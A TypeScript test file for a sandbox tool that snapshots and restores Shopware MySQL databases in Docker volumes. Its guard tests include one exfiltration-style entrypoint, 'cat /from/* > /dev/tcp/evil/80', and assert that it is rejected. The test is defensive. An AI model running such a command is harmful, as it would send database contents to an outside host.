import crypto from 'node:crypto';
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { Readable } from 'node:stream';
import '../isolate-data';
import { makePluginRepo } from '../support/plugin-repo';
import { startFakeGithub } from '../support/github-fake';
/* eslint-disable @typescript-eslint/no-explicit-any -- loose JSON bodies in assertions */

// Stored databases ("Gespeicherte Datenbanken") and their snapshots, with FakeRunner: the library (no expiry, not bound to a task, kept
// after the import), the snapshot taken from a cleanly stopped MySQL after the first import, the restore into a fresh data volume before
// the next task's container starts (no import), independence of two tasks, invalidation by a new image, fallback when a copy fails,
// deletion (file + volumes), sweep, LOTSE_SANDBOX_DB_SNAPSHOTS=0, the guards for volumes and the copy container, and the routes.
for (const k of ['LOTSE_SANDBOX', 'LOTSE_PASSWORD', 'ALLOWED_HOSTS', 'HOSTNAME', 'HOST', 'AICB_DOCKER', 'LOTSE_BIND', 'LOTSE_SANDBOX_MAX', 'LOTSE_SANDBOX_NETWORK', 'LOTSE_SANDBOX_SUBNET', 'LOTSE_SANDBOX_RUNNER', 'LOTSE_SANDBOX_DB_SNAPSHOTS']) delete process.env[k];
process.env.LOTSE_SANDBOX_MAX = '10';
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'lotse-dbsnap-'));
const theme = makePluginRepo(tmp, { theme: true });
process.env.LOTSE_GITHUB_CLONE_BASE = `file://${theme.remoteBase}`;
const TOKEN = `github_pat_${'Sn4pTest42'.repeat(8)}_abc`;
const gh = await startFakeGithub({ token: TOKEN, repos: [{ fullName: 'acme/shop-theme' }] });
process.env.LOTSE_GITHUB_API_BASE = gh.base;

const { FakeRunner } = await import('../../src/server/sandbox/fake-runner');
const { setRunner } = await import('../../src/server/sandbox/runner');
const { allowFileRemotesForTests } = await import('../../src/server/git');
const { saveGithub } = await import('../../src/server/github');
const E = await import('../../src/server/sandbox/env');
const J = await import('../../src/server/sandbox/jobs');
const T = await import('../../src/server/sandbox/tasks');
const R = await import('../../src/server/sandbox/reconcile');
const D = await import('../../src/server/sandbox/dumps');
const SP = await import('../../src/server/sandbox/db-snapshot-spec');
const G = await import('../../src/server/sandbox/guards');
const db = await import('../../src/server/db');
const { buildSpec, IMPORT_ARGV, MYSQL_STOP_ARGV, MYSQL_START_ARGV } = await import('../../src/server/sandbox/templates/dockware');
const dumpsRoute = await import('../../src/app/api/sandbox/dumps/route');
const dumpRoute = await import('../../src/app/api/sandbox/dumps/[id]/route');
const completeRoute = await import('../../src/app/api/sandbox/dumps/[id]/complete/route');
const envRoute = await import('../../src/app/api/sandbox/env/route');

const IMAGE = 'dockware/shopware:6.7.15.1', IMAGE2 = 'dockware/shopware:6.7.15.2';
allowFileRemotesForTests(true);
saveGithub({ token: TOKEN });
const fake = new FakeRunner();
fake.images.add(IMAGE);
setRunner(fake);
E.saveSandbox({ enabled: true });
after(async () => { R.resetReconcile(); await fake.close(); await gh.close(); fs.rmSync(tmp, { recursive: true, force: true }); });

const until = async (fn: () => boolean, ms = 10_000) => { const end = Date.now() + ms; while (!fn()) { if (Date.now() > end) throw new Error('timeout'); await new Promise(r => setTimeout(r, 10)); } };
const settled = (id: string) => until(() => !J.setupRunning(id) && T.getTask(id)!.status !== 'setting_up');
const isImport = (argv: string[] | undefined) => JSON.stringify(argv) === JSON.stringify(IMPORT_ARGV);
const opsOf = (taskId: string) => {
  const c = T.getTask(taskId)!.containerId;
  return fake.calls.filter(x => x.id === c || (x.op === 'create' && (x.detail as any)?.Labels?.['lotse.task'] === taskId));
};
const SQL = Buffer.from("-- MySQL dump\nINSERT INTO `migration` VALUES ('Shopware\\\\Core\\\\Migration\\\\V6_7\\\\Migration1700000000Foo',1,NULL,NULL,NULL);\nINSERT INTO `product` VALUES (1);\n");
async function stored(name = 'shop.sql', data = SQL) {
  const d = D.createDump(name, data.length, Date.now(), { library: true, uploadedBy: 'alex' });
  await D.appendChunk(d.id, 0, Readable.from([data]));
  return D.completeDump(d.id);
}
async function runTask(dumpId: string | undefined, title = 'Mit gespeicherter DB') {
  const t = T.createTask({ chatId: crypto.randomUUID(), title, goal: '', repo: 'acme/shop-theme', baseBranch: 'main', ...(dumpId ? { dumpId } : {}) });
  J.runSteps(t.id);
  await settled(t.id);
  return T.getTask(t.id)!;
}
const step = (t: any, id: string) => t.steps.find((s: any) => s.id === id);
const req = (url: string, init: RequestInit = {}) => new Request(`http://127.0.0.1${url}`, init);
const ctx = (id: string) => ({ params: Promise.resolve({ id }) });

test('library: stored database keeps its file in dumps/library, shows its Shopware version, never expires, attaches to many tasks', async () => {
  const d = await stored();
  assert.equal(d.library, true);
  assert.equal(d.shopwareVersion, '6.7');
  assert.equal(d.uploadedBy, 'alex');
  assert.ok(D.dumpFile(d.id).includes(`${path.sep}dumps${path.sep}library${path.sep}${d.id}${path.sep}`));
  assert.equal(fs.statSync(D.dumpFile(d.id)).mode & 0o777, 0o600);
  assert.equal(D.publicDump(d).expiresAt, null, 'a complete stored database does not expire');
  // the sweep keeps it long after 24 h; an unfinished stored upload expires like a one-off dump
  const half = D.createDump('half.sql', 100, Date.now(), { library: true });
  assert.deepEqual(D.sweepDumps(() => null, Date.now() + 48 * 3600_000), [half.id]);
  assert.equal(db.codeDumpGet(d.id)!.status, 'ready');
  // bound to no task: two tasks may use it, each use is recorded
  const a = D.attachDump(d.id, 't_aaaaaaaaaaaa', Date.parse('2026-10-01T10:00:00Z')), b = D.attachDump(d.id, 't_bbbbbbbbbbbb');
  assert.equal(a.taskId, null); assert.equal(b.taskId, null);
  assert.ok(Date.parse(db.codeDumpGet(d.id)!.lastUsedAt!) > Date.parse('2026-10-01T10:00:00Z'));
  D.deleteTaskDumps('t_aaaaaaaaaaaa');
  assert.equal(db.codeDumpGet(d.id)!.status, 'ready', 'finishing a task never deletes a stored database');
  assert.equal(D.dumpPathFor(d.id, 't_cccccccccccc'), D.dumpFile(d.id));
  D.deleteDump(d.id);
  assert.ok(!fs.existsSync(path.dirname(D.dumpFile(d.id, true))));
});

test('first task imports, then snapshots the cleanly stopped MySQL; the second task restores it before its container starts, without import', async () => {
  const d = await stored();
  const a = await runTask(d.id, 'Erste');
  assert.equal(a.status, 'ready', a.error ?? '');
  assert.equal(a.dbVolume, true);
  const aVol = SP.taskDbVolume(a.id), snap = SP.snapshotVolume(d.id, IMAGE);
  // the container mounts its own data volume at MySQL's data directory
  const spec = (fake.calls.find(c => c.op === 'create' && (c.detail as any).name === `lotse-sbx-${a.id.replace('_', '-')}`)!.detail as any);
  assert.deepEqual(spec.HostConfig.Mounts, [{ Type: 'volume', Source: aVol, Target: '/var/lib/mysql', ReadOnly: false }]);
  assert.ok(opsOf(a.id).some(c => isImport(c.argv)), 'imported');
  assert.match(step(a, 'import-db').log.join('\n'), /gespeicherte Datenbank bleibt für weitere Sandboxes erhalten/);
  assert.ok(fs.existsSync(D.dumpFile(d.id)), 'the stored file stays');
  assert.deepEqual(T.publicTask(a).dump, { name: 'shop.sql', size: SQL.length, sha256: d.sha256, imported: true, deleted: false, ignoreVersion: false, library: true });
  // snapshot: stop as root → copy container (task volume → snapshot, read-only source, no network) → start as root, right after set-domain
  assert.equal(step(a, 'db-snapshot').state, 'done');
  const order = fake.calls.filter(c => (c.op === 'exec' && c.id === a.containerId && [MYSQL_STOP_ARGV, MYSQL_START_ARGV].some(x => JSON.stringify(x) === JSON.stringify(c.argv))) || (c.op === 'create' && (c.detail as any).Labels?.['lotse.role'] === 'db-copy'))
    .map(c => (c.op === 'create' ? `copy ${(c.detail as any).HostConfig.Mounts.map((m: any) => `${m.Source}${m.ReadOnly ? ':ro' : ''}`).join(' → ')}` : `${c.argv!.join(' ')} as ${c.user}`));
  assert.deepEqual(order, ['service mysql stop as root', `copy ${aVol}:ro → ${snap}`, 'service mysql start as root']);
  const copySpec = fake.calls.find(c => c.op === 'create' && (c.detail as any).Labels?.['lotse.role'] === 'db-copy')!.detail as any;
  assert.equal(copySpec.HostConfig.NetworkMode, 'none');
  assert.deepEqual(copySpec.HostConfig.SecurityOpt, ['no-new-privileges:true']);
  assert.ok(![...fake.containers.values()].some(c => c.spec.Labels['lotse.role'] === 'db-copy'), 'the copy container is removed');
  const steps = a.steps.map(s => s.id), at = steps.indexOf('db-snapshot');
  assert.deepEqual([steps[at - 1], steps[at + 1]], ['set-domain', 'preview-tidy'], 'before anything of the task changes the database');
  assert.deepEqual(fake.volumes.get(snap)!.data, [`import:${SQL.length}`]);
  assert.deepEqual(fake.volumes.get(snap)!.labels, { 'lotse.managed': '1', 'lotse.role': 'db-snapshot', 'lotse.dump': d.id, 'lotse.image': IMAGE });
  assert.deepEqual(db.codeDumpGet(d.id)!.snapshots.map(s => [s.image, s.volume]), [[IMAGE, snap]]);

  // the second task: its fresh volume is filled from the snapshot before its container is created; nothing is imported
  const b = await runTask(d.id, 'Zweite');
  assert.equal(b.status, 'ready', b.error ?? '');
  const bVol = SP.taskDbVolume(b.id);
  const bCalls = fake.calls.slice(fake.calls.findIndex(c => c.op === 'createVolume' && (c.detail as any).name === bVol));
  const copyAt = bCalls.findIndex(c => c.op === 'create' && (c.detail as any).Labels?.['lotse.role'] === 'db-copy');
  const createAt = bCalls.findIndex(c => c.op === 'create' && (c.detail as any).name?.startsWith('lotse-sbx-'));
  assert.ok(copyAt >= 0 && copyAt < createAt, 'restored before the task container (and MySQL) exists');
  assert.deepEqual((bCalls[copyAt].detail as any).HostConfig.Mounts.map((m: any) => [m.Source, m.Target, m.ReadOnly]), [[snap, '/from', true], [bVol, '/to', false]]);
  assert.ok(!opsOf(b.id).some(c => isImport(c.argv)), 'no import');
  assert.equal(step(b, 'import-db').state, 'done');
  assert.match(step(b, 'import-db').log.join('\n'), /aus dem Snapshot übernommen – kein Import nötig/);
  assert.equal(step(b, 'db-snapshot').state, 'skipped');
  assert.equal(T.publicTask(b).dump!.restored, true);
  assert.deepEqual(fake.volumes.get(bVol)!.data, [`import:${SQL.length}`]);
  // independent copies: a change in one task's database reaches neither the snapshot nor the other task
  fake.volumes.get(aVol)!.data.push('order 1001');
  assert.deepEqual(fake.volumes.get(bVol)!.data, [`import:${SQL.length}`]);
  assert.deepEqual(fake.volumes.get(snap)!.data, [`import:${SQL.length}`]);
  // the version check still runs (dump vs. image)
  assert.equal(step(b, 'version-check').state, 'done');

  // finishing a task removes its data volume, never the snapshot or the stored file
  await J.finishTask(a.id);
  assert.ok(!fake.volumes.has(aVol));
  assert.ok(fake.volumes.has(snap) && fs.existsSync(D.dumpFile(d.id)));
  await J.finishTask(b.id);
});

test('a copy that fails on restore falls back to the import; a failed snapshot copy costs only the snapshot', async () => {
  const d = await stored('fallback.sql');
  fake.copyExit = 1; // first task: the snapshot copy fails
  const a = await runTask(d.id, 'Kopie scheitert');
  assert.equal(a.status, 'ready', a.error ?? '');
  assert.equal(step(a, 'db-snapshot').state, 'skipped');
  assert.match(step(a, 'db-snapshot').log.join('\n'), /Snapshot nicht angelegt: Datenbank-Kopie fehlgeschlagen \(Exit-Code 1\): cp: write error/);
  assert.ok(fake.calls.some(c => c.op === 'exec' && c.id === a.containerId && JSON.stringify(c.argv) === JSON.stringify(MYSQL_START_ARGV)), 'MySQL started again');
  assert.deepEqual(db.codeDumpGet(d.id)!.snapshots, []);
  assert.ok(!fake.volumes.has(SP.snapshotVolume(d.id, IMAGE)), 'no half-written snapshot remains');
  fake.copyExit = 0;
  const b = await runTask(d.id, 'Snapshot klappt');
  assert.equal(step(b, 'db-snapshot').state, 'done');
  fake.copyExit = 1; // third task: the restore fails → import as usual
  const c = await runTask(d.id, 'Wiederherstellen scheitert');
  fake.copyExit = 0;
  assert.equal(c.status, 'ready', c.error ?? '');
  assert.match(step(c, 'start-container').log.join('\n'), /Snapshot nicht nutzbar .* stattdessen importiert/);
  assert.ok(opsOf(c.id).some(x => isImport(x.argv)), 'imported instead');
  assert.ok(!T.publicTask(c).dump!.restored);
  for (const t of [a, b, c]) await J.finishTask(t.id);
});

test('a volume with the snapshot name that is not Lotse\'s: no quick start and no snapshot, the import runs, the volume is not touched', async () => {
  const d = await stored('foreign.sql'), snap = SP.snapshotVolume(d.id, IMAGE);
  // recorded snapshot whose volume was replaced outside Lotse by an unlabelled one of the same name
  const a = await runTask(d.id, 'Snapshot anlegen');
  assert.equal(step(a, 'db-snapshot').state, 'done');
  fake.volumes.set(snap, { name: snap, labels: {}, data: ['foreign'] });
  const b = await runTask(d.id, 'Fremdes Volume');
  assert.equal(b.status, 'ready', b.error ?? '');
  assert.match(step(b, 'start-container').log.join('\n'), /Snapshot nicht nutzbar \(.*gehört nicht zu Lotse.*\) – die Datenbank wird stattdessen importiert/);
  assert.ok(opsOf(b.id).some(x => isImport(x.argv)), 'imported instead');
  assert.equal(step(b, 'db-snapshot').state, 'skipped');
  assert.match(step(b, 'db-snapshot').log.join('\n'), /Snapshot nicht angelegt: .*gehört nicht zu Lotse/);
  // no recorded snapshot at all: taking one finds the foreign volume and skips
  db.codeDumpPut({ ...db.codeDumpGet(d.id)!, snapshots: [] });
  const c = await runTask(d.id, 'Ohne Eintrag');
  assert.equal(c.status, 'ready', c.error ?? '');
  assert.ok(opsOf(c.id).some(x => isImport(x.argv)), 'imported');
  assert.equal(step(c, 'db-snapshot').state, 'skipped');
  assert.match(step(c, 'db-snapshot').log.join('\n'), /Snapshot nicht angelegt: .*gehört nicht zu Lotse/);
  assert.deepEqual(fake.volumes.get(snap), { name: snap, labels: {}, data: ['foreign'] }, 'the foreign volume is left alone');
  fake.volumes.delete(snap);
  for (const t of [a, b, c]) await J.finishTask(t.id);
});

test('MySQL that does not stop cleanly is not copied; one that does not start again fails the step', async () => {
  const d = await stored('unclean.sql');
  fake.script = argv => (JSON.stringify(argv) === JSON.stringify(MYSQL_STOP_ARGV) ? { exitCode: 1, output: 'mysqld: still running' } : undefined);
  const a = await runTask(d.id, 'Stop scheitert');
  assert.equal(a.status, 'ready');
  assert.match(step(a, 'db-snapshot').log.join('\n'), /nicht sauber beenden \(Exit-Code 1\)/);
  assert.ok(!fake.calls.some(c => c.op === 'create' && (c.detail as any).Labels?.['lotse.role'] === 'db-copy' && (c.detail as any).Labels['lotse.task'] === a.id), 'nothing copied');
  fake.script = argv => (JSON.stringify(argv) === JSON.stringify(MYSQL_START_ARGV) ? { exitCode: 1, output: ' * Starting MySQL database server mysqld\n   ...fail!' } : undefined);
  const b = await runTask(d.id, 'Start scheitert');
  fake.script = () => undefined;
  assert.equal(b.status, 'failed');
  assert.match(b.error!, /MySQL startet nach dem Snapshot nicht wieder \(Exit-Code 1\)/);
  assert.deepEqual(db.codeDumpGet(d.id)!.snapshots, [], 'not recorded');
  for (const t of [a, b]) await J.finishTask(t.id);
});

test('a new image invalidates the snapshot (removed by the sweep, the next task imports again); deleting the stored database removes file and volumes', async () => {
  const d = await stored('image.sql');
  const a = await runTask(d.id, 'Vor dem Image-Wechsel');
  const snap = SP.snapshotVolume(d.id, IMAGE);
  assert.ok(fake.volumes.has(snap));
  // the list shows the quick start for the configured image only
  let list = await (await dumpsRoute.GET(req('/api/sandbox/dumps'))).json() as any;
  assert.equal(list.dumps.find((x: any) => x.id === d.id).snapshot, true);
  // environment: a new image tag → stale snapshot removed (route triggers the sweep)
  fake.images.add(IMAGE2);
  const res = await envRoute.PUT(req('/api/sandbox/env', { method: 'PUT', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ image: IMAGE2 }) }));
  assert.equal(res.status, 200);
  await until(() => !fake.volumes.has(snap));
  assert.deepEqual(db.codeDumpGet(d.id)!.snapshots, []);
  list = await (await dumpsRoute.GET(req('/api/sandbox/dumps'))).json() as any;
  assert.equal(list.dumps.find((x: any) => x.id === d.id).snapshot, false);
  const b = await runTask(d.id, 'Nach dem Image-Wechsel');
  assert.ok(opsOf(b.id).some(c => isImport(c.argv)), 'imported again');
  const snap2 = SP.snapshotVolume(d.id, IMAGE2);
  assert.notEqual(snap2, snap);
  assert.ok(fake.volumes.has(snap2));
  // delete: file, row and every snapshot volume; audited; tasks keep their own data volume
  const del = await dumpRoute.DELETE(req(`/api/sandbox/dumps/${d.id}`, { method: 'DELETE' }) as any, ctx(d.id));
  assert.equal(del.status, 200);
  assert.equal(db.codeDumpGet(d.id)!.status, 'deleted');
  assert.ok(!fs.existsSync(D.dumpFile(d.id, true)));
  assert.ok(!fake.volumes.has(snap2));
  assert.ok(fake.volumes.has(SP.taskDbVolume(b.id)), 'a running sandbox keeps its database');
  const audit = db.auditList(10).find(e => e.kind === 'sandbox-dump' && e.dumpId === d.id && e.action === 'delete');
  assert.ok(audit?.library);
  E.saveSandbox({ image: IMAGE });
  for (const t of [a, b]) await J.finishTask(t.id);
});

test('sweep: unrecorded snapshots and data volumes of finished or unknown tasks go; a snapshot being written stays', async () => {
  const d = await stored('sweep.sql');
  const keep = SP.snapshotVolume(d.id, IMAGE);
  await fake.createVolume(keep, { 'lotse.managed': '1', 'lotse.role': 'db-snapshot', 'lotse.dump': d.id, 'lotse.image': IMAGE });
  db.codeDumpPut({ ...db.codeDumpGet(d.id)!, snapshots: [{ image: IMAGE, volume: keep, createdAt: new Date().toISOString() }] });
  const orphanSnap = SP.snapshotVolume('d_zzzzzzzzzzzzzzzz', IMAGE), orphanTask = SP.taskDbVolume('t_zzzzzzzzzzzz');
  await fake.createVolume(orphanSnap, { 'lotse.managed': '1', 'lotse.role': 'db-snapshot' });
  await fake.createVolume(orphanTask, { 'lotse.managed': '1', 'lotse.role': 'task-db', 'lotse.task': 't_zzzzzzzzzzzz' });
  const removed = await R.sweepDbVolumesNow();
  assert.deepEqual(removed.sort(), [orphanSnap, orphanTask].sort());
  assert.ok(fake.volumes.has(keep));
  // the stored database deleted (e.g. Docker was down at the time): its snapshot goes with the next sweep
  D.deleteDump(d.id);
  assert.deepEqual(await R.sweepDbVolumesNow(), [keep]);
});

test('LOTSE_SANDBOX_DB_SNAPSHOTS=0: every task imports, no snapshot is taken', async () => {
  process.env.LOTSE_SANDBOX_DB_SNAPSHOTS = '0';
  try {
    const d = await stored('off.sql');
    const a = await runTask(d.id, 'Aus 1'), b = await runTask(d.id, 'Aus 2');
    for (const t of [a, b]) {
      assert.ok(opsOf(t.id).some(c => isImport(c.argv)));
      assert.equal(step(t, 'db-snapshot').state, 'skipped');
    }
    assert.match(step(a, 'db-snapshot').log.join('\n'), /LOTSE_SANDBOX_DB_SNAPSHOTS=0/);
    assert.deepEqual(db.codeDumpGet(d.id)!.snapshots, []);
    for (const t of [a, b]) await J.finishTask(t.id);
  } finally { delete process.env.LOTSE_SANDBOX_DB_SNAPSHOTS; }
});

test('a one-off dump stays as before: no data volume, deleted after the import, no snapshot', async () => {
  const data = SQL, one = D.createDump('once.sql', data.length);
  await D.appendChunk(one.id, 0, Readable.from([data]));
  await D.completeDump(one.id);
  const t = await runTask(one.id, 'Einmal');
  assert.equal(t.dbVolume, false);
  assert.ok(!fake.volumes.has(SP.taskDbVolume(t.id)));
  assert.equal(db.codeDumpGet(one.id)!.status, 'deleted');
  assert.equal(step(t, 'db-snapshot').state, 'skipped');
  await J.finishTask(t.id);
});

test('guards: a task container mounts only its own data volume at /var/lib/mysql; the copy container only exactly its fixed form', async () => {
  const task = 't_abcdefghijkl', own = SP.taskDbVolume(task), snap = SP.snapshotVolume('d_abcdefghijklmnop', IMAGE);
  const base = buildSpec({ taskId: task, image: IMAGE, memoryMb: 4096, cpus: 2, env: [], dbVolume: own });
  assert.doesNotThrow(() => G.assertSafeSpec(base));
  const withMounts = (m: unknown[]) => ({ ...base, HostConfig: { ...base.HostConfig, Mounts: m } });
  assert.throws(() => G.assertSafeSpec(withMounts([{ Type: 'volume', Source: SP.taskDbVolume('t_otherotherxx'), Target: '/var/lib/mysql' }])), /eigenes Datenbank-Volume/);
  assert.throws(() => G.assertSafeSpec(withMounts([{ Type: 'volume', Source: snap, Target: '/var/lib/mysql' }])), /eigenes Datenbank-Volume/, 'never a snapshot directly');
  assert.throws(() => G.assertSafeSpec(withMounts([{ Type: 'volume', Source: own, Target: '/var/www/html' }])), /Datenverzeichnis/);
  assert.throws(() => G.assertSafeSpec(withMounts([{ Type: 'bind', Source: own, Target: '/var/lib/mysql' }])), /muss „volume“ sein/);
  assert.throws(() => G.assertSafeSpec(withMounts([{ Type: 'volume', Source: own, Target: '/var/lib/mysql', VolumeOptions: { DriverConfig: { Name: 'local', Options: { device: '/' } } } }])), /VolumeOptions ist nicht erlaubt/);
  assert.throws(() => buildSpec({ taskId: task, image: IMAGE, memoryMb: 4096, cpus: 2, env: [], dbVolume: SP.taskDbVolume('t_otherotherxx') }), /Datenbank-Volume/);
  const copy = SP.buildCopySpec({ taskId: task, image: IMAGE, from: snap, to: own });
  assert.doesNotThrow(() => G.assertSafeSpec(copy));
  assert.doesNotThrow(() => G.assertSafeSpec(SP.buildCopySpec({ taskId: task, image: IMAGE, from: own, to: snap })));
  assert.throws(() => SP.buildCopySpec({ taskId: task, image: IMAGE, from: snap, to: SP.snapshotVolume('d_otherotherotherx', IMAGE) }), /Ungültige Volumes/);
  const host = copy.HostConfig as any;
  const bad = (patch: Record<string, unknown>, re: RegExp) => assert.throws(() => G.assertSafeSpec({ ...copy, ...patch } as any), re, JSON.stringify(patch));
  bad({ Entrypoint: ['sh', '-c', 'cat /from/* > /dev/tcp/evil/80'] }, /Befehl oder Benutzer des Kopier-Containers/);
  bad({ Cmd: ['x'] }, /Befehl oder Benutzer/);
  bad({ Image: 'alpine:3' }, /Image des Kopier-Containers/);
  bad({ HostConfig: { ...host, NetworkMode: 'lotse-sandbox' } }, /ohne Netzwerk/);
  bad({ HostConfig: { ...host, CapDrop: ['NET_RAW'] } }, /CapDrop/);
  bad({ HostConfig: { ...host, Mounts: [host.Mounts[0], { ...host.Mounts[1], Source: SP.taskDbVolume('t_otherotherxx') }] } }, /eigenen Aufgabe/);
  bad({ HostConfig: { ...host, Mounts: [{ ...host.Mounts[0], ReadOnly: false }, host.Mounts[1]] } }, /nur lesend/);
  bad({ Env: ['A=1'] }, /ohne Umgebung/);
  bad({ name: 'lotse-dbcopy-other' }, /Name oder Label/);
  // a task container can never use the copy container's freedoms
  assert.throws(() => G.assertSafeSpec({ ...base, Entrypoint: ['sh'] } as any), /nur für den Datenbank-Kopier-Container/);
  assert.throws(() => G.assertSafeSpec({ ...base, HostConfig: { ...base.HostConfig, NetworkMode: 'none' } } as any), /muss lotse-sandbox sein/);
  // volume names: only the two patterns
  for (const n of ['mysql', 'lotse-db-x', 'lotse-taskdb-../x', `${own}-x`]) assert.throws(() => SP.assertVolumeName(n), /nicht verwaltet/);
  // the runner refuses a mount of a volume that does not exist (Docker would create an unlabelled one) or is not Lotse's
  await assert.rejects(fake.create(base), /fehlt/);
  fake.volumes.set(own, { name: own, labels: {}, data: [] });
  await assert.rejects(fake.inspectVolume(own), /gehört nicht zu Lotse/);
  await assert.rejects(fake.removeVolume(own), /gehört nicht zu Lotse/);
  assert.deepEqual((await fake.listVolumes()).map(v => v.name).filter(n => n === own), [], 'unlabelled volumes are never listed');
  fake.volumes.delete(own);
  await assert.rejects(fake.createVolume(own, {}), /Lotse-Label/);
});

test('routes: POST keep=true creates a stored database (uploader recorded), GET lists only complete stored ones; environment default', async () => {
  const create = await dumpsRoute.POST(req('/api/sandbox/dumps', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ name: 'kept.sql', size: SQL.length, keep: true }) }));
  assert.equal(create.status, 201);
  const { dump } = await create.json() as any;
  assert.equal(dump.library, true);
  const put = await dumpRoute.PUT(new (await import('next/server')).NextRequest(`http://127.0.0.1/api/sandbox/dumps/${dump.id}?offset=0`, { method: 'PUT', body: SQL, headers: { 'content-length': String(SQL.length) } }), ctx(dump.id));
  assert.equal(put.status, 200);
  let list = await (await dumpsRoute.GET(req('/api/sandbox/dumps'))).json() as any;
  assert.ok(!list.dumps.some((x: any) => x.id === dump.id), 'not listed before it is complete');
  const done = await completeRoute.POST(req(`/api/sandbox/dumps/${dump.id}/complete`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{}' }), ctx(dump.id));
  assert.equal(done.status, 200);
  list = await (await dumpsRoute.GET(req('/api/sandbox/dumps'))).json() as any;
  const row = list.dumps.find((x: any) => x.id === dump.id);
  assert.deepEqual(Object.keys(row).sort(), ['createdAt', 'id', 'lastUsedAt', 'name', 'shopwareVersion', 'size', 'snapshot', 'uploadedBy']);
  assert.equal(row.shopwareVersion, '6.7');
  assert.ok(!JSON.stringify(list).includes('MySQL dump') && !JSON.stringify(list).includes(path.sep + 'dumps'), 'never content or a host path');
  // environment default: only a stored database; forgotten once it is deleted
  assert.throws(() => E.saveSandbox({ defaultDumpId: 'd_nonexistentnonex' }), /nicht \(mehr\) gespeichert/);
  E.saveSandbox({ defaultDumpId: dump.id });
  assert.equal(E.sandboxPublic().defaultDumpId, dump.id);
  await dumpRoute.DELETE(req(`/api/sandbox/dumps/${dump.id}`, { method: 'DELETE' }) as any, ctx(dump.id));
  assert.equal(E.sandboxPublic().defaultDumpId, '');
});
